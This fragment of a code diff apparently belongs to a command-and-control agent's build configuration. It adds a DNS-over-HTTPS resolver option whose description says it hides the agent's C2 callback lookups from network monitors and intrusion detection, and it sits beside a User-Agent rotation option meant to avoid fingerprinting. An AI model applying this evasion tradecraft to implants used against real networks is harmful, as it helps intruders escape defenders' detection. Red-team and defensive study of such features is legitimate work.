@@ -278,6 +278,14 @@ var payloadDefinition = agentstructs.PayloadType{
 			Choices:       []string{"uniform", "normal", "exponential"},
 		},
 		{
+			Name:          "doh_resolver",
+			Description:   "DNS-over-HTTPS resolver for ALL agent DNS queries. When set, all hostname resolution (including C2 callbacks) goes through encrypted HTTPS instead of plaintext UDP/TCP DNS. This makes DNS queries invisible to network monitors and NDR/IDS. Providers: cloudflare, google, quad9. Leave empty to use system DNS.",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
+			Choices:       []string{"", "cloudflare", "google", "quad9"},
+		},
+		{
 			Name:          "user_agent_pool",
 			Description:   "Optional: Newline-separated list of User-Agent strings. When set, the agent rotates through the pool per-request instead of using a single static User-Agent. Reduces network fingerprinting. Leave empty to use the default Chrome UA.",
 			Required:      false,
